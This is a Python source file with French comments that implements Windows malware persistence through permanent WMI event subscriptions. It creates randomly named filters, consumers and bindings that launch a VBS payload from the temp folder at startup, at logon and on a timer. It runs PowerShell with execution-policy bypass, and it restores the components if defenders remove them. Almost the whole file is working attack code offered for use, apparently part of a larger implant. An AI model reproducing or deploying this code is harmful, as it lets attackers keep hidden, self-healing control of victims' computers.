import subprocess
import random
import string
import time
import os

class WMIPersistence:
    """Gère la persistance via des événements WMI."""
    
    def __init__(self, settings):
        """Initialise le gestionnaire de persistance WMI."""
        self.settings = settings
        self.event_filters = []
        self.event_consumers = []
        self.bindings = []
        
    def _generate_random_name(self, prefix="MS"):
        """Génère un nom aléatoire pour les composants WMI."""
        random_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        return f"{prefix}_{random_id}"
        
    def create_startup_event(self):
        """Crée un événement de démarrage système via WMI."""
        try:
            # Noms des composants WMI
            filter_name = self._generate_random_name("StartupFilter")
            consumer_name = self._generate_random_name("StartupConsumer")
            binding_name = self._generate_random_name("StartupBinding")
            
            # Chemin du fichier à exécuter
            exec_path = os.path.join(self.settings.temp_dir, self.settings.vbs_filename)
            
            # Échapper correctement le chemin pour PowerShell
            ps_exec_path = exec_path.replace('\\', '\\\\')
            
            # Créer le filtre d'événement (démarrage du système)
            filter_query = f"""
            $Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
                Name = "{filter_name}";
                EventNamespace = "root\\cimv2";
                QueryLanguage = "WQL";
                Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
            }}
            """
            
            # Créer le consommateur d'événement
            consumer_query = f"""
            $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
                Name = "{consumer_name}";
                ExecutablePath = "wscript.exe";
                CommandLineTemplate = "\\"{ps_exec_path}\\"";
            }}
            """
            
            # Créer la liaison entre le filtre et le consommateur
            binding_query = f"""
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
                Filter = [WMI]"root\\subscription:__EventFilter.Name='{filter_name}'";
                Consumer = [WMI]"root\\subscription:CommandLineEventConsumer.Name='{consumer_name}'";
            }}
            """
            
            # Exécuter les requêtes PowerShell
            ps_script = filter_query + consumer_query + binding_query
            ps_command = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "{ps_script}"'
            
            process = subprocess.run(ps_command, shell=True, capture_output=True, text=True)
            
            if process.returncode == 0:
                print(f"[+] Événement WMI de démarrage créé: {filter_name} -> {consumer_name}")
                self.event_filters.append(filter_name)
                self.event_consumers.append(consumer_name)
                self.bindings.append(binding_name)
                return True
            else:
                print(f"[-] Erreur lors de la création de l'événement WMI: {process.stderr}")
                return False
                
        except Exception as e:
            print(f"[-] Erreur lors de la création de l'événement WMI: {e}")
            return False
    
    def create_logon_event(self):
        """Crée un événement de connexion utilisateur via WMI."""
        try:
            # Noms des composants WMI
            filter_name = self._generate_random_name("LogonFilter")
            consumer_name = self._generate_random_name("LogonConsumer")
            binding_name = self._generate_random_name("LogonBinding")
            
            # Chemin du fichier à exécuter
            exec_path = os.path.join(self.settings.temp_dir, self.settings.vbs_filename)
            
            # Échapper correctement le chemin pour PowerShell
            ps_exec_path = exec_path.replace('\\', '\\\\')
            
            # Créer le filtre d'événement (connexion utilisateur)
            filter_query = f"""
            $Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
                Name = "{filter_name}";
                EventNamespace = "root\\cimv2";
                QueryLanguage = "WQL";
                Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'explorer.exe'"
            }}
            """
            
            # Créer le consommateur d'événement
            consumer_query = f"""
            $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
                Name = "{consumer_name}";
                ExecutablePath = "wscript.exe";
                CommandLineTemplate = "\\"{ps_exec_path}\\"";
            }}
            """
            
            # Créer la liaison entre le filtre et le consommateur
            binding_query = f"""
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
                Filter = [WMI]"root\\subscription:__EventFilter.Name='{filter_name}'";
                Consumer = [WMI]"root\\subscription:CommandLineEventConsumer.Name='{consumer_name}'";
            }}
            """
            
            # Exécuter les requêtes PowerShell
            ps_script = filter_query + consumer_query + binding_query
            ps_command = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "{ps_script}"'
            
            process = subprocess.run(ps_command, shell=True, capture_output=True, text=True)
            
            if process.returncode == 0:
                print(f"[+] Événement WMI de connexion créé: {filter_name} -> {consumer_name}")
                self.event_filters.append(filter_name)
                self.event_consumers.append(consumer_name)
                self.bindings.append(binding_name)
                return True
            else:
                print(f"[-] Erreur lors de la création de l'événement WMI: {process.stderr}")
                return False
                
        except Exception as e:
            print(f"[-] Erreur lors de la création de l'événement WMI: {e}")
            return False
    
    def create_time_trigger_event(self, interval_minutes=30):
        """Crée un événement temporel périodique via WMI."""
        try:
            # Noms des composants WMI
            filter_name = self._generate_random_name("TimeFilter")
            consumer_name = self._generate_random_name("TimeConsumer")
            binding_name = self._generate_random_name("TimeBinding")
            
            # Chemin du fichier à exécuter
            exec_path = os.path.join(self.settings.temp_dir, self.settings.vbs_filename)
            
            # Échapper correctement le chemin pour PowerShell
            ps_exec_path = exec_path.replace('\\', '\\\\')
            
            # Créer le filtre d'événement (minuterie)
            filter_query = f"""
            $Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
                Name = "{filter_name}";
                EventNamespace = "root\\cimv2";
                QueryLanguage = "WQL";
                Query = "SELECT * FROM __InstanceModificationEvent WITHIN {interval_minutes} WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0"
            }}
            """
            
            # Créer le consommateur d'événement
            consumer_query = f"""
            $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
                Name = "{consumer_name}";
                ExecutablePath = "wscript.exe";
                CommandLineTemplate = "\\"{ps_exec_path}\\"";
            }}
            """
            
            # Créer la liaison entre le filtre et le consommateur
            binding_query = f"""
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
                Filter = [WMI]"root\\subscription:__EventFilter.Name='{filter_name}'";
                Consumer = [WMI]"root\\subscription:CommandLineEventConsumer.Name='{consumer_name}'";
            }}
            """
            
            # Exécuter les requêtes PowerShell
            ps_script = filter_query + consumer_query + binding_query
            ps_command = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "{ps_script}"'
            
            process = subprocess.run(ps_command, shell=True, capture_output=True, text=True)
            
            if process.returncode == 0:
                print(f"[+] Événement WMI temporel créé: {filter_name} -> {consumer_name}")
                self.event_filters.append(filter_name)
                self.event_consumers.append(consumer_name)
                self.bindings.append(binding_name)
                return True
            else:
                print(f"[-] Erreur lors de la création de l'événement WMI: {process.stderr}")
                return False
                
        except Exception as e:
            print(f"[-] Erreur lors de la création de l'événement WMI: {e}")
            return False
    
    def setup_wmi_persistence(self):
        """Configure tous les mécanismes de persistance WMI."""
        print("[+] Configuration des événements WMI persistants...")
        
        success = False
        
        # Tenter de créer divers types d'événements WMI
        if self.create_startup_event():
            success = True
            
        if self.create_logon_event():
            success = True
            
        if self.create_time_trigger_event(random.randint(20, 40)):
            success = True
            
        return success
    
    def check_wmi_persistence(self):
        """Vérifie l'état des persistances WMI et les restaure si nécessaire."""
        try:
            # Commande PowerShell pour vérifier les filtres WMI existants
            check_cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "'
            check_cmd += 'Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Select-Object -ExpandProperty Name; '
            check_cmd += 'Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Select-Object -ExpandProperty Name'
            check_cmd += '"'
            
            result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"[-] Erreur lors de la vérification WMI: {result.stderr}")
                return self.setup_wmi_persistence()
                
            # Convertir la sortie en liste
            existing_components = [line.strip() for line in result.stdout.split('\n') if line.strip()]
            
            # Vérifier si nos événements WMI sont toujours présents
            missing_components = []
            for component in self.event_filters + self.event_consumers:
                if component not in existing_components:
                    missing_components.append(component)
            
            if missing_components:
                print(f"[!] {len(missing_components)} composants WMI manquants - Restauration en cours...")
                return self.setup_wmi_persistence()
            
            print("[+] Persistance WMI vérifiée: tous les composants sont actifs")
            return True
        except Exception as e:
            print(f"[-] Erreur lors de la vérification de la persistance WMI: {e}")
            return False